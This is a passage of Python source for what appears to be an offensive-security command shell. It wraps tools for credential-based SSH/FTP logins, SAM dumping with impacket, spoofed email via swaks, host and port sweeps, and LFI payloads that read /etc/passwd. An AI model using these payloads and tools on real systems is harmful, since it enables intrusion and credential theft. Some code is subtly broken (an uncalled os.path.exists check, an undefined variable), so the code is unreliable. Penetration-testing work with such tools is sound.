            # This will display the current working directory, list files, and copy the current directory path to the clipboard.

        Note:
            Ensure that `xclip` is installed on your system for copying to the clipboard to work.
        """
        print_msg(
            f'Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}'
        )
        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
        os.system("pwd | xclip -sel clip")
        print_msg(f" pwd directory copied to clipboard{RESET}")
        return

    def do_qa(self, line):
        """
        Exits the application quickly without confirmation.

        This function performs the following tasks:
        1. Prints an exit message with formatting.
        2. Terminates the `tmux` session named `lazyown_sessions` if it exists.
        3. Kills all running `openvpn` processes.
        4. Exits the program with a status code of 0.

        Usage:
            qa

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `tmux kill-session -t lazyown_sessions 2>/dev/null` is executed to kill the tmux session named `lazyown_sessions`, suppressing errors if the session does not exist.
            2. The command `killall openvpn 2>/dev/null` is executed to terminate all running `openvpn` processes, suppressing errors if no such processes are found.
            3. The program is exited with a status code of 0 using `sys.exit(0)`.

        Dependencies:
            - The function relies on `tmux`, `killall`, and `sys` to perform the exit operations.

        Example:
            qa
            # This will print an exit message, terminate the tmux session and openvpn processes, and exit the program.

        Note:
            Ensure that `tmux` and `openvpn` are installed and running for their respective commands to have an effect.
        """
        print_error(f"Saliendo {BG_BLACK}[;,;]{RESET}")
        os.system("tmux kill-session -t lazyown_sessions 2>/dev/null")
        os.system("killall openvpn 2>/dev/null")
        sys.exit(0)

    def do_ignorearp(self, line):
        """
        Configures the system to ignore ARP requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to ignore ARP requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            ignorearp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to set the `arp_ignore` parameter to `1`, which configures the system to ignore ARP requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            ignorearp
            # This will set the `arp_ignore` parameter to `1` to ignore ARP requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"    {GREEN}[+] Done.{RESET}")
        return

    def do_ignoreicmp(self, line):
        """
        Configures the system to ignore ICMP echo requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to ignore ICMP echo requests (ping).
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            ignoreicmp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to set the `icmp_echo_ignore_all` parameter to `1`, which configures the system to ignore ICMP echo requests (ping).

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            ignoreicmp
            # This will set the `icmp_echo_ignore_all` parameter to `1` to ignore ICMP echo requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}1 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        os.system("sudo bash -c 'echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    def do_acknowledgearp(self, line):
        """
        Configures the system to acknowledge ARP requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore` with elevated privileges using `sudo` to configure the system to acknowledge ARP requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            acknowledgearp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'` is executed to set the `arp_ignore` parameter to `0`, which configures the system to acknowledge ARP requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            acknowledgearp
            # This will set the `arp_ignore` parameter to `0` to acknowledge ARP requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `arp_ignore` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/conf/all/arp_ignore'{RESET}"
        )
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/conf/all/arp_ignore'")
        print_msg(f"Done.{RESET}")
        return

    def do_acknowledgeicmp(self, line):
        """
        Configures the system to respond to ICMP echo requests by setting a kernel parameter.

        This function performs the following tasks:
        1. Prints a message indicating the command that will be executed.
        2. Executes the command `echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all` with elevated privileges using `sudo` to configure the system to respond to ICMP echo requests.
        3. Prints a confirmation message indicating that the operation is complete.

        Usage:
            acknowledgeicmp

        :param line: This parameter is not used in the function but is included for consistency with other command methods.
        :type line: str
        :returns: None

        Manual execution:
            1. The command `sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'` is executed to set the `icmp_echo_ignore_all` parameter to `0`, which configures the system to respond to ICMP echo requests.

        Dependencies:
            - The function requires `sudo` to run the command with elevated privileges.

        Example:
            acknowledgeicmp
            # This will set the `icmp_echo_ignore_all` parameter to `0` to allow responses to ICMP echo requests.

        Note:
            Ensure that you have the necessary permissions to use `sudo` and that the `icmp_echo_ignore_all` parameter can be modified on your system.
        """
        print_msg(
            f"Try... sudo bash -c 'echo {CYAN}0 {RED}> {GREEN}/proc/sys/net/ipv4/icmp_echo_ignore_all'{RESET}"
        )
        os.system("sudo bash -c 'echo 0 > /proc/sys/net/ipv4/icmp_echo_ignore_all'")
        print_msg(f"Done.{RESET}")
        return

    def do_clock(self, line):
        """
        Displays the current date and time, and runs a custom shell script.

        This function performs the following actions:
        1. Constructs a command to get the current date and time in a specified format.
        2. Uses `figlet` to display the current date and time in a large ASCII text format.
        3. Runs a custom shell script (`cal.sh`) to display additional information or perform further actions related to the clock.

        Usage:
            clock

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure that `figlet` is installed on your system for displaying text in large ASCII format.
        2. Make sure `cal.sh` exists in the `modules` directory and is executable.
        3. Run the function to see the current date and time displayed in large ASCII text, followed by the execution of `cal.sh`.

        Note: The function sets the terminal color to white before displaying the date and time, then sets it to green before running the `cal.sh` script. Finally, it resets the terminal color.

        Dependencies:
        - `figlet`: For displaying text in large ASCII format.
        - `cal.sh`: A custom shell script located in the `modules` directory.
        """

        cmd = """
        # Obtiene la fecha y hora actual en el formato deseado
        current_date=$(date +"%Y-%m-%d")
        current_time=$(date +"%H:%M:%S")
        # Muestra la fecha y hora con figlet
        figlet "$current_date"  | lolcat
        figlet "$current_time"  | lolcat
        """
        print_msg(WHITE)
        os.system(cmd)
        print_msg(GREEN)
        os.system("./modules/cal.sh | lolcat")
        print_msg(RESET)
        time.sleep(3)
        os.system("modules/eegg.sh")
        os.system("clear")
        return

    def do_ports(self, line):
        """
        Lists all open TCP and UDP ports on the local system.

        This function performs the following actions:
        1. Calls the `get_open_ports` function to retrieve lists of open TCP and UDP ports.
        2. Prints a header for open TCP ports.
        3. Iterates over the list of open TCP ports, printing each IP address and port number.
        4. Prints a header for open UDP ports.
        5. Iterates over the list of open UDP ports, printing each IP address and port number.

        Usage:
            ports

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure the `get_open_ports` function is defined and properly implemented to return lists of open TCP and UDP ports.
        2. Run the function to display open TCP and UDP ports on the local system.

        Note: The `get_open_ports` function should return two lists of tuples: one for TCP ports and one for UDP ports. Each tuple should contain an IP address and a port number.
        """

        tcp_ports, udp_ports = get_open_ports()
        print_msg(f"Open TCP Ports:{RESET}")
        for ip, port in tcp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")

        print_msg(f"{GREEN}Open UDP Ports:{RESET}")
        for ip, port in udp_ports:
            print_msg(f"{CYAN}{ip}{YELLOW}:{RED}{port}{RESET}")
        return

    def do_ssh(self, line):
        """
        Connects to an SSH host using credentials from a file and a specified port.

        This function performs the following actions:
        1. Retrieves the remote host (`rhost`) from the parameters.
        2. Checks if the `rhost` is valid using the `check_rhost` function.
        3. Sets the SSH port to the value provided in the `line` parameter.
        4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
        5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
        6. Constructs and executes an SSH command using `sshpass` to handle password authentication and `ssh` to initiate the connection.
        7. Displays the SSH command being executed.

        Usage:
            ssh <port>

        :param line: The port number to use for the SSH connection.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure `sessions/credentials.txt` exists and contains valid SSH credentials in the format `user:password`.
        2. Run the function with the port number as an argument.
        3. The function will attempt to connect to the SSH host using each set of credentials and the specified port.

        Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        rport = line  # El puerto será proporcionado como argumento 'line'
        credentials_file = "./sessions/credentials.txt"
        if not os.path.exists:
            print_error(
                "sessions/creadentials.txt must exist ex: createcredentials user:password "
            )
            return

        with open(credentials_file, "r") as file:
            for line in file:
                user, passwd = line.strip().split(":")
                command = f"sshpass -p {passwd} ssh -o StrictHostKeyChecking=no -p {rport} {user}@{rhost}"
                print_msg(command)
                os.system(command)
        return

    def do_ftp(self, line):
        """
        Connects to an ftp host using credentials from a file and a specified port.

        This function performs the following actions:
        1. Retrieves the remote host (`rhost`) from the parameters.
        2. Checks if the `rhost` is valid using the `check_rhost` function.
        3. Sets the ftp port to the value provided in the `line` parameter.
        4. Checks if the `credentials.txt` file exists in the `./sessions` directory.
        5. Reads credentials (username and password) from the `credentials.txt` file, where each line is formatted as `user:password`.
        6. Constructs and executes an ftp command using `sshpass` to handle password authentication and `ftp` to initiate the connection.
        7. Displays the ftp command being executed.

        Usage:
            ftp <port>

        :param line: The port number to use for the ftp connection.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Ensure `sessions/credentials.txt` exists and contains valid ftp credentials in the format `user:password`.
        2. Run the function with the port number as an argument.
        3. The function will attempt to connect to the ftp host using each set of credentials and the specified port.

        Note: Ensure `sshpass` is installed on your system for password-based SSH authentication. If `sshpass` is not available, you may need to install it or use an alternative method for SSH authentication.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        rport = line  # El puerto será proporcionado como argumento 'line'
        credentials_file = "./sessions/credentials.txt"
        if not os.path.exists:
            print_error(
                "sessions/creadentials.txt must exist ex: createcredentials user:password "
            )
            return

        with open(credentials_file, "r") as file:
            for line in file:
                user, passwd = line.strip().split(":")
                command = f"sshpass -p {passwd} ftp {user}@{rhost}"
                print_msg(command)
                os.system(command)
        return

    def do_cports(self, line):
        """
        Generates a command to display TCP and UDP ports and copies it to the clipboard.

        This function performs the following actions:
        1. Defines a command to display TCP and UDP ports from `/proc/net/tcp` and `/proc/net/udp`, respectively.
        2. The command extracts and formats IP addresses and port numbers from these files.
        3. Prints the generated command to the console for verification.
        4. Copies the command to the clipboard using `xclip`.

        Usage:
            cports  # Generates the command and copies it to the clipboard

        :param line: This parameter is not used in this function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function to print the command and copy it to the clipboard.
        2. The command can be pasted into a terminal to display TCP and UDP ports.

        Note: Ensure `xclip` is installed on your system for copying to the clipboard. If `xclip` is not available, you may need to install it or use an alternative method for copying to the clipboard.
        """


        # Define el comando con comillas escapadas adecuadamente
        tcp_cmd = """echo "TCP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/tcp; \
        echo "UDP Ports:"; \
        awk 'NR>1 {split($2, a, ":"); ip=sprintf("%d.%d.%d.%d", strtonum("0x" substr(a[1], 7, 2)), strtonum("0x" substr(a[1], 5, 2)), strtonum("0x" substr(a[1], 3, 2)), strtonum("0x" substr(a[1], 1, 2))); printf "%s:%d\\n", ip, strtonum("0x" a[2])}' /proc/net/udp
        """

        # Imprimir el comando para verificar
        print_msg(f"{GREEN} {tcp_cmd} {RESET}")

        # Copiar el comando al portapapeles
        try:
            # Usamos subprocess para manejar la entrada de manera segura
            process = subprocess.Popen(
                ["xclip", "-sel", "clip"], stdin=subprocess.PIPE, text=True
            )
            process.communicate(input=tcp_cmd)
        except subprocess.CalledProcessError as e:
            print_error(f"Error: {e}{RESET}")

        return

    def do_vpn(self, line):
        """
        Connect to a VPN by selecting from available .ovpn files.

        This function performs the following actions:
        1. Lists all `.ovpn` files in the current directory, sorted alphabetically.
        2. Handles cases with and without arguments:
        - Without arguments: Lists available `.ovpn` files and prompts the user to select one by number.
        - With a single argument: Treats the argument as a number and attempts to connect to the corresponding `.ovpn` file.
        3. Connects to the selected `.ovpn` file using `openvpn` and displays appropriate messages.
        4. Handles invalid input with error messages.

        Usage:
            vpn           # List available .ovpn files and select one to connect to
            vpn <number>  # Connect directly to the .ovpn file corresponding to the number

        :param line: The number of the .ovpn file to connect to, or an empty string to list available files.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function with no arguments to list available `.ovpn` files.
        2. Choose a file by entering the corresponding number.
        3. Alternatively, run the function with a number argument to connect directly to the specified `.ovpn` file.

        Note: Ensure you have the necessary permissions and the `openvpn` command is available on your system.
        """

        # List all .ovpn files
        ovpn_files = sorted([f for f in os.listdir("vpn") if f.endswith(".ovpn")])

        # Determine the file to connect to
        if not line.strip():
            if not ovpn_files:
                print_msg("No .ovpn files found.")
                return

            print_msg("Available .ovpn files:")
            for idx, file in enumerate(ovpn_files, start=1):
                print_msg(f"{idx}: {file}")

            choice = input("Select the number of the .ovpn file to connect to: ")
            try:
                choice = int(choice)
                if 1 <= choice <= len(ovpn_files):
                    file_to_connect = ovpn_files[choice - 1]
                else:
                    print_error("Invalid choice. Please select a number from the list.")
                    return
            except ValueError:
                print_error("Invalid input. Please enter a number.")
                return

        else:
            args = line.split()
            if len(args) == 1:
                try:
                    choice = int(args[0])
                    if 1 <= choice <= len(ovpn_files):
                        file_to_connect = ovpn_files[choice - 1]
                    else:
                        print_error("Invalid number. Please select a number from the list.")
                        return
                except ValueError:
                    print_error("Invalid input. Please enter a number.")
                    return
            else:
                print_error("Invalid command format. Use 'vpn' to list and select, or 'vpn <number>' to connect directly.")
                return

        # Connect to the selected .ovpn file
        print_msg(f"Connecting to vpn/{file_to_connect}")
        os.system(f"openvpn vpn/{file_to_connect}")


    def do_id_rsa(self, line):
        """
        Create an SSH private key file and connect to a remote host using SSH.

        This function performs the following actions:
        1. Checks if the provided remote host (`rhost`) is valid.
        2. Verifies that a username is provided as an argument.
        3. Creates an SSH private key file in the `sessions` directory with a name based on the provided username.
        4. Opens the created file in the `nano` text editor for the user to paste the private key.
        5. Sets the file permissions to read-only for the owner (400).
        6. Connects to the remote host via SSH using the created private key.
        7. Displays a warning message when the SSH connection is closed.

        Usage:
            id_rsa <username>

        :param line: The username for SSH connection and private key file naming.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function:
        1. Run the function with the username argument, e.g., `id_rsa myuser`.
        2. Paste the private key into the `nano` editor when prompted.
        3. Save and exit the editor.
        4. The SSH connection will be established using the private key.

        Note: Ensure you have the necessary permissions to create files and connect via SSH.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        if not line:
            print_error(f"must pass the user by argument like:{GREEN} id_rsa username")
            return
        file = f"sessions/id_rsa_{line}"
        print_msg(f"Try... nano {file}")
        os.system(f"nano {file} && chmod 600 {file}")
        print_msg(
            f"{YELLOW} Conecting to ssh {line}@{rhost} -i {file} {RED}[;,;] {RESET}"
        )
        os.system(f"ssh {line}@{rhost} -i {file}")
        print_warn("ssh conection closed")
        return

    def do_www(self, line):
        """
        Start a web server using Python 3 and display relevant network information.

        This function performs the following actions:
        1. Displays global network interfaces and their IP addresses.
        2. Copies the IP address of the `tun0` interface to the clipboard.
        3. Displays the current working directory and contents of the `sessions` directory.
        4. Starts a Python 3 HTTP server on port 80 in the `sessions` directory.
        5. Displays a message indicating that the web server is running and will show the shutdown message when stopped.

        Usage:
            www

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function, run it to start the web server and follow the on-screen instructions to see the network information and server status.

        Note: Ensure you have `xclip` installed for clipboard operations and have the necessary permissions to run the HTTP server.
        """

        os.system(
            'ip a show scope global | awk \'/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "    [\033[96m" iface"\033[0m] "a[1] }\''
        )
        os.system(
            "ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip"
        )
        os.system(
            'echo "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"'
        )
        print_msg(f"{GREEN} Web server at sessions in port {RED} 80 {RESET}")
        os.system("cd sessions && sudo python3 -m http.server 80")
        print_msg(f"{YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
        return

    def do_wrapper(self, line):
        """
        Copy payloads to clipboard for Local File Inclusion (LFI) attacks.

        This function provides three payload options for Local File Inclusion (LFI) attacks and copies the selected payload to the clipboard using `xclip`. The user is prompted to choose which payload to copy.

        Usage:
            wrapper

        :param line: This parameter is not used in the function.
        :type line: str
        :returns: None

        Manual execution:
        To manually use this function, run it and follow the prompts to select one of the three predefined payloads. The selected payload will be copied to the clipboard.

        Note: Ensure `xclip` is installed on your system for clipboard operations.
        """


        command1 = "echo ' php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd' | xclip -sel clip"
        command2 = "echo ' file:///proc/self/cmdline' | xclip -sel clip"
        command3 = "echo ' file:///etc/passwd' | xclip -sel clip"

        print_warn("<modo de uso>")
        print_msg(f"{command1=}")
        print_msg(f"{command2=}")
        print_msg(f"{command3=}")
        print_warn("</modo de uso>")
        choice = input(
            f"    {CYAN}[?] {MAGENTA}Which payload would you like to copy to the clipboard? (1, 2 or 3): {RESET}"
        ).strip()

        if choice == "1":
            os.system(command1)
            print_msg(f"Payload 1 copied to Clipboard")
        elif choice == "2":
            os.system(command2)
            print_msg(f"Payload 2 copied to Clipboard")
        elif choice == "3":
            os.system(command3)
            print_msg(f"Payload 3 copied to Clipboard")
        else:
            print_error("Invalid choice. Please select 1, 2 or 3.")
        return

    def do_swaks(self, line):
        """
        Sends an email using `swaks` (Swiss Army Knife for SMTP).

        This method constructs and executes a `swaks` command to send an email from an attacker’s address
        to a victim’s address, with a specified message body. The command is executed using the SMTP server
        address provided in the parameters.

        Parameters:
        - `line`: (str) Input line that is not used in this function.

        Functionality:
        1. Retrieves the SMTP server address (`rhost`) from the object's parameters.
        2. Checks if the server address is valid using `check_rhost()`.
        3. Prompts the user for the sender's email address (`from_attacker`).
        4. Prompts the user for the recipient's email address (`to_victim`).
        5. Prompts the user for the message body (`body`).
        6. Constructs the `swaks` command with the provided options.
        7. Executes the command using `os.system()`.
        8. Copies the command to the clipboard using `copy2clip()`.

        Example usage:
        >>> do_swaks("line")
        
        swaks --from attacker@hell.com --to victim@heaven.com,victim2@heaven.com,victim3@heaven.com   --body "testing" --server 127.0.0.1
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        from_attacker = input(
            f"    {CYAN}[?] {MAGENTA}FROM:  {RESET}"
        ).strip()    
        to_victim = input(
            f"    {CYAN}[?] {MAGENTA}TO:  {RESET}"
        ).strip()    
        body = input(
            f"    {CYAN}[?] {MAGENTA}BODY:  {RESET}"
        ).strip()
        command = f"swaks --from {from_attacker} --to {to_victim} --body {body} --server {rhost}"
        os.system(command)
        copy2clip(command)
        return

    def do_samrdump(self, line):
        """
        Run `impacket-samrdump` to dump SAM data from specified ports.

        This function executes `impacket-samrdump` to retrieve SAM data from the target host on ports 139 and 445. It first checks if the `rhost` parameter is valid, and if so, it runs the command for both ports.

        Usage:
            samrdump <target_host>

        :param line: The target host to dump SAM data from.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, specify the target host. The function will attempt to dump SAM data from the host on ports 139 and 445.
        impacket-samrdump -port 445 10.10.10.10
        Note: Ensure that `impacket-samrdump` is installed and properly configured on your system.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return
        print_msg(f"Try... impacket-samrdump -port 139  {rhost}")
        os.system(f"impacket-samrdump -port 139  {rhost}")
        print_msg(f"Try... impacket-samrdump -port 445  {rhost}")
        os.system(f"impacket-samrdump -port 445  {rhost}")

        return

    def do_urlencode(self, line):
        """
        Encode a string for URL.

        This function takes a string as input, encodes it for URL compatibility using the `quote` function, and prints the encoded result.

        Usage:
            urlencode <string_to_encode>

        :param line: The string to encode for URL.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a string to be URL-encoded as an argument. The function will encode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to encode.")
            return

        encoded_string = quote(line.strip())
        print_msg(encoded_string)
        copy2clip(encoded_string)
        return

    def do_urldecode(self, line):
        """
        Decode a URL-encoded string.

        This function takes a URL-encoded string as input, decodes it using the `unquote` function, and prints the decoded result.

        Usage:
            urldecode <url_encoded_string>

        :param line: The URL-encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a URL-encoded string as an argument. The function will decode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to decode.")
            return

        decoded_string = unquote(line.strip())
        print_msg(decoded_string)
        copy2clip(decoded_string)
        return

    def do_lynis(self, line):
        """
        Performs a Lynis audit on the specified remote system.

        This function executes the `modules/lazylynis.sh` script with the target host defined in the `rhost` parameter. It is used to perform a security audit of the remote system using Lynis.

        Usage:
            lynis

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, ensure that the `modules/lazylynis.sh` script is available and executable. Provide the target host in the format `lynis`.
        sudo lynis audit system remote 10.10.10.10 more info check modules/lazylynis.sh
        Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message. For more details, check `modules/lazylynis.sh`.
        """

        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... sudo modules/lazylynis.sh {rhost}")
        os.system(f"sudo modules/lazylynis.sh {rhost}")

        return

    def do_snmpcheck(self, line):
        """
        Performs an SNMP check on the specified target host.

        This function executes the `snmp-check` command against the target host defined in the `rhost` parameter.

        Usage:
            snmpcheck

        :param line: This parameter is not used in the current implementation.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, ensure that `snmp-check` is installed and provide a target host in the format `snmpcheck`.
        snmp-check 10.10.10.10
        Note: The function assumes that `rhost` is a valid host address. If `rhost` is not valid, it will print an error message.
        """
        rhost = self.params["rhost"]
        if not check_rhost(rhost):
            return

        print_msg(f"Try... snmp-check {rhost}")
        os.system(f"snmp-check {rhost}")
        return

    def do_encode(self, line):
        """
        Encodes a string using the specified shift value and substitution key.

        This function encodes the given string by applying a shift value and a substitution key.

        Usage:
            encode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be encoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to encode in the format `encode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """

        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: encode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Encode the input string
        encoded_string = encode(input_string, shift_value, substitution_key)
        print_msg(f"Encoded string: {encoded_string}")
        decoded_string(encoded_string)
        copy2clip(encoded_string)
        return

    def do_decode(self, line):
        """
        Decode a string using the specified shift value and substitution key.

        This function decodes the given string by applying a shift value and a substitution key to reverse the encoding process.

        Usage:
            decode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be decoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to decode in the format `decode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """
        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: decode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Decode the input string
        decoded_string = decode(input_string, shift_value, substitution_key)
        print_msg(f"Decoded string: {decoded_string}")
        copy2clip(decoded_string)
        return
        
    def do_creds(self, line):
        """
        Display the credentials stored in the `credentials.txt` file and copy the password to the clipboard.

        This function reads the stored credentials from a file named `credentials.txt` located in the `sessions` directory.
        The file should be in the format `username:password`. If the file does not exist, an error message will be printed
        instructing the user to create the credentials file first. The function extracts the username and password from the file,
        prints them, and copies the password to the clipboard using `xclip`.

        :param line: A string parameter that is not used in this function. It is included for compatibility with command-line
                    interface functions.

        :returns: None

        Manual execution:
        To manually perform the equivalent actions, follow these steps:

            1. Ensure the file `sessions/credentials.txt` exists and contains credentials in the format `username:password`.
            2. Read the file and extract the username and password.
            3. Print the username and password to the console.
            4. Use the `xclip` tool to copy the password to the clipboard. Example command:

                echo '<password>' | xclip -sel clip

        Example:
        If `sessions/credentials.txt` contains `admin:password123`, the function will print:

            User : admin
            Pass : password123

        The password `password123` will be copied to the clipboard.

        Note:
        Ensure `xclip` is installed on your system for copying to the clipboard. The function assumes that `xclip` is available
        and correctly configured.
        """
        path = os.getcwd()    
        file = f"{path}/sessions/credentials.txt"
        if not os.path.exists(file):
            print_error("You need use createcredentials user:pass before.")
            return
        
        with open(file, "rb") as f:
            data = f.read()
        creds = data.split(b":")
        user = creds[0].decode('utf-8')
        passwd = creds[1].decode('utf-8').replace('\n','')
        print_msg(f"User : {user}")
        print_msg(f"Pass : {passwd}")
        copy2clip(passwd)
        print_msg(command)
        return

    def do_hostdiscover(self, line):
        """
        Discover active hosts in a subnet by performing a ping sweep.

        This method constructs and executes a bash script that performs a 
        ping sweep on the specified subnet to identify active hosts. The 
        subnet is determined from the 'rhost' parameter. For each host in 
        the subnet, a ping request is sent, and active hosts are reported.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the first three octets of the 'rhost' parameter to form 
        the base IP pattern.
        - Constructs a bash script to ping each IP address in the subnet 
        (from .1 to .254) and reports active hosts.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the 
        generated command.
        - If the user confirms, executes the command using `os.system()`.
        - If the user declines, copies the command to the clipboard using 
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
        - May modify the clipboard content if the user chooses not to execute.

        Notes:
        - Ensure that the 'rhost' parameter is a valid IP address and that 
        the `check_rhost()` function is implemented to validate the IP.
        - `print_msg()` is used to display the constructed command to the 
        user.
        - `copy2clip()` is used to copy the command to the clipboard if 
        not executed.

        Example:
        >>> do_hostdiscover("example_input")
        """
        rhost = self.params['rhost']
        if not check_rhost(rhost):
            return
        oct_rhost = rhost.split('.')
        pattern = oct_rhost[0] + "." + oct_rhost[1] + "." + oct_rhost[2] 
        command = """        #!/bin/bash
        for i in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 {pattern}.$i" &>/dev/null && echo "[+] Host {pattern}.$i - active" &
        done; wait
        """.replace('        ','').replace('{pattern}',pattern)
        print_msg(command)
        execute = input("Do you want to execute? (yes/no): ").strip().lower()
        if execute == 'yes':
            os.system(command)
        else:
            copy2clip(command)
        return

    def do_portdiscover(self, line):
        """
        Scan all ports on a specified host to identify open ports.

        This method constructs and executes a bash script that performs a 
        port scan on the specified host to determine which ports are open. 
        It scans all ports from 0 to 65535 and reports any that are open.

        Parameters:
        - line (str): The input line argument is not used in this function.

        Behavior:
        - Extracts the 'rhost' parameter to determine the target IP address.
        - Constructs a bash script to scan all ports on the target IP address 
        and report open ports.
        - The generated bash script is displayed to the user.
        - Prompts the user to confirm whether they want to execute the 
        generated command.
        - If the user confirms, executes the command using `os.system()`.
        - If the user declines, copies the command to the clipboard using 
        `copy2clip()`.

        Side Effects:
        - Executes system commands and may affect the system environment.
